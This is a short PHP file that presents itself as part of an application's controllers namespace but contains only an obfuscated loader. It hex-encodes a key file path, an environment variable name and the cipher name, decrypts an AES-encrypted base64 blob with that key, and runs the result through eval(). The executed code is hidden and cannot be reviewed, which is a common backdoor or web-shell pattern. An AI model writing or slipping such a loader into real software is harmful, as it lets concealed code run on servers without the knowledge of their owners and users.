<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('UCVW+btKsNjBfJxQthZcSQ==');

$c=base64_decode(

'kpkO62AUQnJoMISRz4ZU0lC6SjxiucpsZlvscycKXamTXzxfh3uNhJsYThM0qy8hG7C1n0Fe2Nc+' .
'6V9TRZsVig3y3D1Rmiz+5iKQlb5yqX55XhlBNM8AbJwycPii73tuXn6l4QBMmbe+votdIdXw89vI' .
'wEBCEq6CMP1YV+VlIrGaE9hIdaouoWakXJ6NTSLr1zg+5+Lk153T85S+q7gCpEpuQ/Nipo9vAuLK' .
'09RsND9pbZfoEUiy/gSI/Ichnxlgkah+brvXtMCYB0yz9FqsdQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

